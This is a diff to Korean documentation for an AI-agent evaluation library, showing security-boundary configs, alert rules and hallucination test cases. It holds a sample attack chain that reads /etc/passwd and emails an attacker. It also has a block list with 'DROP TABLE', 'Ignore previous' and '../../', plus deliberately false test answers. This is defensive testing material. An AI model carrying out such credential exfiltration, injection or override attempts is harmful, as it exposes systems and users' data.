@@ -17,7 +17,8 @@
 > 📖 **관련 레퍼런스**
 > - **[Appendix A — 58개 지표 완전 레퍼런스](../Appendix/A_58개지표_레퍼런스.md)**: Group E 지표 입력·출력
 > - **[Appendix A §Part 2 — Config 레퍼런스](../Appendix/A_58개지표_레퍼런스.md)**: Group E Config 파라미터 전체 목록
-> - **[Evaluator_Examples/02_layer2_agentic_security.py](../../Evaluator_Examples/02_layer2_agentic_security.py)**: 보안 트래커 실전 예제
+> - **[Evaluator_Examples/ch05_group_b.py](../../Evaluator_Examples/ch05_group_b.py)**: 보안 트래커 실전 예제
+> - **[Evaluator_Examples/ch04_group_a.py](../../Evaluator_Examples/ch04_group_a.py)**: Gate E FAIL 시나리오 — 시나리오 4 (ComplianceConfig·ThreatSeverityConfig)
 
 > **독자별 읽기 가이드**  
 > - **QA 관리자**: §8.1(개요) → §8.4(Config 설정) → §8.5(임계값·Gate 판정) 순서로 읽으면 "어떤 위협 기준을 선언할지"를 빠르게 파악할 수 있습니다.  
@@ -152,7 +153,7 @@ print(f"Prompt Injection: {d.get('prompt_injection_count', 0)}")
 | 권한 위임 악용 | 다른 에이전트나 서비스에게 자신보다 높은 권한 위임 요청 |
 
 ```python
-# 출처: Evaluator_Examples/02_layer2_agentic_security.py, 보안 섹션 — PrivilegeEscalationDetector
+# 출처: Evaluator_Examples/ch05_group_b.py, 보안 섹션 — PrivilegeEscalationDetector
 from agent_evaluator import PerformanceMonitor
 
 monitor = PerformanceMonitor(
@@ -182,6 +183,7 @@ search("admin credentials") → read_file("/etc/passwd") → send_email(attacker
 CVSS(Common Vulnerability Scoring System) 기반 위협 심각도 임계값을 선언한다.
 
 ```python
+# 출처: Evaluator_Examples/ch08_group_e.py, 역케이스 Gate E FAIL (ThreatSeverityConfig)
 from agent_evaluator import ThreatSeverityConfig
 
 ThreatSeverityConfig(
@@ -210,6 +212,7 @@ ThreatSeverityConfig(
 **사용 예시:**
 
 ```python
+# 출처: Evaluator_Examples/ch08_group_e.py, 섹션 Gate E Security Boundary
 from agent_evaluator import PerformanceMonitor
 from agent_evaluator import ThreatSeverityConfig
 from agent_evaluator.decorators import agent_eval
@@ -239,6 +242,7 @@ def public_agent(question: str, ground_truth: str = "") -> str:
 GDPR, HIPAA 등 컴플라이언스 프레임워크 요구사항을 선언하고, 응답에 PII가 포함되는지 자동으로 검사한다.
 
 ```python
+# 출처: Evaluator_Examples/ch08_group_e.py, 역케이스 Gate E FAIL (ComplianceConfig)
 from agent_evaluator import ComplianceConfig
 
 ComplianceConfig(
@@ -283,6 +287,7 @@ hipaa_config = ComplianceConfig(
 보안 위협이 탐지되었을 때 에이전트가 적절히 대응하는지 평가한다. 탐지 후 "차단했는가?", "보고했는가?", "중단했는가?"를 측정한다.
 
 ```python
+# 출처: Evaluator_Examples/ch08_group_e.py, 섹션 Gate E Security Boundary
 from agent_evaluator import ThreatResponseConfig
 
 ThreatResponseConfig(
@@ -421,13 +426,14 @@ def agent(question: str, ground_truth: str = "") -> str:
 
 | 예제 파일 | 관련 내용 |
 |---------|---------|
-| [`Evaluator_Examples/08_harness_eval.py`](../../Evaluator_Examples/08_harness_eval.py) | 섹션 5: Group E Security Boundary — 3개 Config 실전 예제 |
-| [`Evaluator_Examples/02_layer2_agentic_security.py`](../../Evaluator_Examples/02_layer2_agentic_security.py) | 섹션 6~7: InputSanitizationTracker·OutputLeakageDetector 실전 예제 |
+| [`Evaluator_Examples/ch03_harness_basics.py`](../../Evaluator_Examples/ch03_harness_basics.py) | 섹션 5: Group E Security Boundary — 3개 Config 실전 예제 |
+| [`Evaluator_Examples/ch05_group_b.py`](../../Evaluator_Examples/ch05_group_b.py) | 섹션 6~7: InputSanitizationTracker·OutputLeakageDetector 실전 예제 |
+| [`Evaluator_Examples/ch04_group_a.py`](../../Evaluator_Examples/ch04_group_a.py) | 시나리오 4: Gate E FAIL (ComplianceConfig·ThreatSeverityConfig 고위협 출력) |
 
-**핵심 코드 (출처: `Evaluator_Examples/08_harness_eval.py`, 섹션 5 — Group E Security Boundary)**
+**핵심 코드 (출처: `Evaluator_Examples/ch03_harness_basics.py`, 섹션 5 — Group E Security Boundary)**
 
 ```python
-# 출처: Evaluator_Examples/08_harness_eval.py, 섹션 5 — Group E Security Boundary
+# 출처: Evaluator_Examples/ch08_group_e.py, 섹션 Gate E Security Boundary
 from agent_evaluator import (
     ThreatSeverityConfig, ComplianceConfig, ThreatResponseConfig,
 )
@@ -492,8 +498,81 @@ SECURITY_CASES = [
 ```
 
 ```bash
-python Evaluator_Examples/08_harness_eval.py           # Group E 포함 전체
-python Evaluator_Examples/02_layer2_agentic_security.py  # 보안 Tracker 예제
+python Evaluator_Examples/ch03_harness_basics.py           # Group E 포함 전체
+python Evaluator_Examples/ch05_group_b.py  # 보안 Tracker 예제
+python Evaluator_Examples/ch04_group_a.py  # Gate E FAIL — 배포 차단 케이스
+```
+
+**Layer 1 할루시네이션 탐지 — 보안 관점 (출처: `Evaluator_Examples/ch02_first_eval.py`)**
+
+할루시네이션은 잘못된 정보 생성이라는 점에서 보안 위협이기도 하다. `enable_hallucination_detection=True` 설정으로 Group E와 연계한 이중 방어를 구성한다.
+
+```python
+# 출처: Evaluator_Examples/ch02_first_eval.py, 섹션 할루시네이션 — 할루시네이션 탐지 (보안 관점)
+from agent_evaluator import PerformanceMonitor, create_taskresult
+
+monitor = PerformanceMonitor(
+    output_dir="results/",
+    enable_hallucination_detection=True,   # HallucinationDetector 활성
+    enable_security_metrics=True,          # InputSanitizationTracker 등 활성
+)
+
+# 사실 불일치 → 잘못된 의료·법률·금융 정보 생성 = 보안 위협
+HALLUCINATION_CASES = [
+    (
+        "아인슈타인의 출생 연도?",
+        "알베르트 아인슈타인은 1879년 독일 울름에서 태어난 물리학자입니다.",
+        "아인슈타인은 1865년 미국 뉴욕에서 태어났습니다.",  # 연도·장소 오류
+        "1879년, 독일 울름",
+    ),
+    (
+        "서울의 인구는?",
+        "서울특별시의 인구는 약 950만 명입니다.",
+        "서울의 인구는 약 3200만 명입니다.",  # 수치 오류 — 금융 보고서라면 심각한 위험
+        "950만 명",
+    ),
+]
+
+for q, ctx, resp, gt in HALLUCINATION_CASES:
+    result = create_taskresult(
+        task_id=f"hall_{hash(q) % 10000:04d}",
+        question=q, response=resp, ground_truth=gt, context=ctx,
+        execution_time=1.0, task_type="information_retrieval",
+        tokens_used={"input": 120, "output": 40, "total": 160},
+    )
+    monitor.record_task(result)
+
+report = monitor.generate_report().to_dict()
+hall = report.get("quality_metrics", {}).get("hallucination", {})
+print(hall.get("avg_hallucination_score"))   # 0.0 = 완전 일치, 1.0 = 심각한 불일치
+# → ThreatSeverityConfig + 할루시네이션 이중 방어: 입력 공격 + 출력 사실 왜곡 모두 탐지
+```
+
+**보안 임계값 실시간 알림 (출처: `Evaluator_Examples/ch16_alerts.py`)**
+
+```python
+# 출처: Evaluator_Examples/ch16_alerts.py, 섹션 3 — 보안 임계값 SimpleTaskAlertRule
+from agent_evaluator import SimpleTaskAlertRule
+from agent_evaluator.decorators import agent_eval
+
+# 보안 위협 탐지 시 즉시 알림 — accuracy 급락이 공격 성공 시그널
+security_alert = SimpleTaskAlertRule(
+    name="security_accuracy_drop",
+    condition=lambda tr: tr.accuracy_score < 0.3,   # 공격 성공 시 응답 품질 붕괴
+    handler=lambda msg, tr: print(f"[Security ALERT] {tr.task_id}: acc={tr.accuracy_score:.2f}"),
+    severity="critical",
+    cooldown=0,
+)
+
+@agent_eval(
+    monitor, task_type="qa", task_id_prefix="e_alert",
+    alert_rules=[security_alert],
+)
+def security_monitored_agent(question: str, ground_truth: str = "") -> str:
+    if any(p in question for p in ["DROP TABLE", "Ignore previous", "../../"]):
+        return "차단됨: 보안 위협 감지"
+    return f"안전하게 처리: {question}"
+# → 프롬프트 인젝션 성공 시 accuracy 급락 → critical 알림 즉시 발생
 ```
 
 ---
